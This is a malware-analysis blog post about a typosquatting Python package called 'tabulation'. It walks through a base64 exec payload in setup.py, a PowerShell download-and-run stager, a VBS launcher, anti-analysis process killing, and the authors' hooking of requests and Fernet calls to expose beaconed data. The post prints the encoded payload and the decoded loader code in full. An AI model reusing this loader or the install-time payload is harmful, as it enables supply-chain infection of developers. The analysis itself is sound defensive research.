---
publishDate: 2023-07-12T00:00:00Z
title: A Gap in the Armor
excerpt: Exploiting third party dependancies to bypass PyArmor obfuscation.
image: ~/assets/images/armor-henry-hustava-unsplash.jpg
category: Malware Analysis
tags:
  - malware
  - pyarmor
  - analysis
---

Before we begin, a gentle shoutout to Lockness Ko, our dynamic analysis specialist, for his assistance with the dynamic analysis portion of this particular malicious package.

On the 26th of June, a Python package named **tabulation** came across our malware feed. It displayed all the signs of being a malicious package-- executing a base64 string within the setup.py portion of the package, and squatting a fairly well known package, **tabulate** by utilizing it's README and Github pages in the metadata. As we do with all packages that are suspected to be malicious, we began an analysis.

## The Payload

As mentioned, the payload contained a base64 encoded string that would execute upon the installation of the package. Nothing shockingly out of the ordinary or ground breaking here on the malware front, this is a common tactic, it's easy to detect, and this particular version was easy enough to reverse as well.

```python
exec(base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3MsIG9zCmRlZiByKGMpOiA\
KICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MuUG9wZW4oYywgc2hlbGw9VHJ1ZSwgc3Rka\
W49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI\
9c3VicHJvY2Vzcy5TVERPVVQsIGNsb3NlX2Zkcz1UcnVlKQogICAgb3V0cHV0ID0gc\
mVzdWx0LnN0ZG91dC5yZWFkKCkKZGVmIHIyKGMpOgogICAgc3VicHJvY2Vzcy5Qb3B\
lbihjLCBzaGVsbD1UcnVlLCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZG91dD1zd\
WJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgY2xvc2VfZmR\
zPVRydWUpCmlmIG9zLm5hbWUgPT0gIm50IjoKICAgIGlmIG5vdCBvcy5wYXRoLmV4a\
XN0cyhyIkM6L1Byb2dyYW1EYXRhL1VwZGF0ZXIiKToKICAgICAgICByKHIicG93ZXJ\
zaGVsbCAtY29tbWFuZCAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29ud\
GludWUnOyAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWU\
nOyBJbnZva2UtV2ViUmVxdWVzdCAtVXNlQmFzaWNQYXJzaW5nIC1VcmkgaHR0cHM6L\
y90cmFuc2Zlci5zaC9UVVVwUXJVdTlkL0luc3RhbGwuemlwIC1PdXRGaWxlICRlbnY\
6dG1wL2luc3QuemlwOyBFeHBhbmQtQXJjaGl2ZSAtRm9yY2UgLUxpdGVyYWxQYXRoI\
CRlbnY6dG1wL2luc3QuemlwIC1EZXN0aW5hdGlvblBhdGggQzovUHJvZ3JhbURhdGE\
7IFJlbW92ZS1JdGVtICRlbnY6dG1wL2luc3QuemlwIikKICAgICAgICBmcm9tIGRhd\
GV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhOyB0ID0gKGRhdGV0aW1lLm5\
vdygpICsgdGltZWRlbHRhKG1pbnV0ZXM9MSkpLnN0cmZ0aW1lKCclSDolTScpCiAgI\
CAgICAgcjIoZidzY2h0YXNrcyAvQ3JlYXRlIC9TQyBPTkNFIC9TVCB7dH0gL1ROICJ\
VcGRhdGVyIiAvVFIgIkM6XFByb2dyYW1EYXRhXEluc3RhbGxcaW52aXMudmJzIicp"))
```

So let's unpack this a bit. As with most of these, you can simply swap the `exec` for a `print` and out will pop the 'obfuscated' payload.

```python
import subprocess, os
def r(c):
    result = subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
    output = result.stdout.read()
def r2(c):
    subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
if os.name == "nt":
    if not os.path.exists(r"C:/ProgramData/Updater"):
        r(r"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri xxxx://transfer.sh/xxxx/Install.zip -OutFile $env:tmp/inst.zip; Expand-Archive -Force -LiteralPath $env:tmp/inst.zip -DestinationPath C:/ProgramData; Remove-Item $env:tmp/inst.zip")
        from datetime import datetime, timedelta; t = (datetime.now() + timedelta(minutes=1)).strftime('%H:%M')
        r2(f'schtasks /Create /SC ONCE /ST {t} /TN "Updater" /TR "C:\ProgramData\Install\invis.vbs"')
```

Now this is a little more exciting. As we can see, we use Powershell's `Invoke-WebRequest` to quietly curl down an **install.zip** file from transfer.sh and to unpack it into a known location. It then invokes the Windows Task Scheduler to execute **invis.vbs** a minute after the subprocess is executed. Presumably, this is to allow for the file to download and decompress. But what exactly do these files contain, and what is invis.vbs doing?

```vb
Set oShell = CreateObject ("Wscript.Shell")
Dim strArgs
strArgs = "cmd /c pythonw C:\ProgramData\Install\inst.pyw"
oShell.Run strArgs, 0, false
```

This creates a WScript Shell, which invokes **inst.pyw**. We're now at Russian nesting dolls of staging. But bare with me, because this is where it gets interesting. As I said, the initial file dropped **installer.zip** was a ziparchive and decompressed during download. The file also contained the **pyarmor_runtime** and **inst.pyw** files. These, as you can likely glean by the name alone, are PyArmor obfuscated files. This presents a unique challenge, PyArmor unpackers are well documented running up to Python 3.10, but recent changes to the bytecode and opmaps in Python 3.11 have caused many of the ways these deobfuscators function to fail. And as anticipated, several off-the-shelf unpackers like Svenskithesource's [PyArmor-Unpacker](https://github.com/Svenskithesource/PyArmor-Unpacker) were ineffective at handling this new bytecode change.

## Dynamic Analysis

So with our static unpackers struggling to work through the PyArmor obfuscation, we shifted to dynamic analysis. I mentioned Lockness Ko earlier in the article; he was kind enough to lend a Dynamic Analysis sandbox for the next portion. We began as most dynamic analysis solutions do-- spinning up PCAP and packet sniffing software, turning on ProcMon and running the program. The first time we managed to get the program to run in the sandbox, Wireshark immediately died. A good indicator that we're dealing with something that's attempting to enumerate the virtual machine. We moved network monitoring out of the sandbox and tried again...

And not much happened. We killed the process and pulled up ProcMon to see if there was something we were missing, but we weren't catching a whole lot. So in the spirit of seeing if this was some sort of delayed execution, we went ahead and ran the file one more time and let it sit for what felt like an eternity. And we waited. And we waited. And at last, we had something. ProcMon started firing off system events for enumeration of the current environment.

```
"10:09:44.5260407 PM","WScript.exe","3396","Process Create","C:\Windows\System32\cmd.exe","SUCCESS","PID: 4292, Command line: ""C:\Windows\System32\cmd.exe"" /c pythonw C:\ProgramData\Install\inst.pyw"
"10:09:45.6561948 PM","pythonw.exe","5020","Process Create","C:\Program Files\Python311\Scripts\pip.exe","SUCCESS","PID: 1188, Command line: pip install requests"
"10:09:52.1659818 PM","pythonw.exe","5020","Process Create","C:\Program Files\Python311\Scripts\pip.exe","SUCCESS","PID: 2064, Command line: pip install cryptography"
"10:10:07.6860549 PM","pythonw.exe","5020","Process Create","C:\Windows\System32\Wbem\wmic.exe","SUCCESS","PID: 1476, Command line: wmic process get name"
"10:10:08.4851339 PM","pythonw.exe","5020","Process Create","C:\Windows\system32\cmd.exe","SUCCESS","PID: 1436, Command line: C:\Windows\system32\cmd.exe /c ""taskkill /f /im wireshark.exe"""
"10:10:08.4951144 PM","pythonw.exe","5020","Process Create","C:\Windows\system32\cmd.exe","SUCCESS","PID: 4632, Command line: C:\Windows\system32\cmd.exe /c ""taskkill /f /im dumpcap.exe"""
"10:10:08.5035489 PM","pythonw.exe","5020","Process Create","C:\Windows\system32\cmd.exe","SUCCESS","PID: 3844, Command line: C:\Windows\system32\cmd.exe /c ""taskkill /f /im processhacker.exe"""
"10:10:08.5120777 PM","pythonw.exe","5020","Process Create","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","PID: 1052, Command line: powershell.exe get-process | format-table mainwindowtitle"
```

Now I'd like to draw some attention to several lines here.
`taskkill /f /im wireshark.exe` - The source of our dead Wireshark on the first run.
`pip install requests` and `pip install cryptography` will be very important very soon.
We can see the outbound beaconing in Wireshark, given that we've moved Wireshark outside of the virtual machine. We can see it calling to a **tor.pm** address in our PCAP's. Since we're not catching the events in process monitor, this must mean that ~~the call is coming from inside the house~~ the requests are being transmitted through Python. But what is this actually doing, what information is being communicated?

Well as previously mentioned, we saw **requests** and **cryptography** installed through subprocesses. So that gives us some good intuition about the kind of interface we might be dealing with for this information. Intuition dictated that hooking the **requests** POST API function might spill out the information we're looking for. So we did just that.

**requests/api.py**

```python
def post(url, data=None, json=None, **kwargs):
    with open("C:\Windows\Temp\post.txt", "a") as f:
        f.write(url, data, json, sep='\n')
    ...
```

Running this, as anticipated, caused any POSTs utilizing the Python Requests package to write themselves to a file. We went ahead and ran the script again and...

```
REQUEST
xxxx://xxxx.tor.pm/
{'1': 'gAAAAABkoRHTIO_HSkSBxDbFaarHWwX8T1qKIUgbuhaf0-294oY_TR1RuYFPVXYBkG5lQIKw2rRV7oPxL-CaKsiPerMKdwV5sUO1MEn3GZw3RToeSQXqvYo=',
...}
```

And that's not shockingly helpful. However, we do have some excellent pretext for what this information might actually be! If you recall earlier, the **cryptography** package was installed during the execution of the malware. Fernet is a very common cryptography format used in Python, and more importantly, the `gAAAAAB`refers to a fairly fixed portion, the "fixed" timestamp. This allowed us to confirm that these were indeed Fernet encrypted payloads. For those unfamiliar with Fernet, it is a symmetric encryption algorithm utilizing a key. For our purposes, that is the brief of it. For those looking to read more, you can find a writeup on Fernet encryption in the [PYCA Cryptography documents](https://cryptography.io/en/latest/fernet/). Equipped with that information, we went ahead and enumerated the Cryptography package as well. Utilizing the same techniques we used in the requests modification, we hooked the `generate_key()` and `encrypt()` functions to also write their arguments to a file. So, for one final, time, we went ahead and ran the program, with all the appropriate functions hooked. And it worked perfectly!

```
========
model vbox harddisk
==============
product  virtualbox
==============
version  vbox- 1
==============
name system idle process system  registrysmss.execsrss.exe  wininit.exeservices.exe  lsass.exe  svchost.exesvchost.exefontdrvhost.exe  svchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.execsrss.exe  winlogon.exe  fontdrvhost.exe  dwm.exe sihost.exe taskhostw.exe explorer.exe  shellexperiencehost.exeruntimebroker.exeruntimebroker.exeapplicationframehost.exe  svchost.exediscord.exediscord.exediscord.exediscord.exediscord.exediscord.exegooglecrashhandler.exe googlecrashhandler64.exe  procmon64.exe cmd.exe conhost.exepowershell.exechrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe cmd.exe conhost.exepythonw.exewmiprvse.exe  wmic.execonhost.exe
```

Quite underwhelmingly, this seems to enumerate running processes and user information and signal back to the server. There were no other signs of additional downloads or file drops.

## Summary

This is but one example of how we can effectively use some creative process hooking and know-how to cause cryptographic functions to spill their secrets when they're relying on external libraries and packages to do that transmission. Dynamic analysis can facilitate introspection into programs that might otherwise use heavy obfuscation, and Python's reputation as an interpreted language makes levying the base level libraries and infrastructure a breeze to enumerate obfuscated malware.
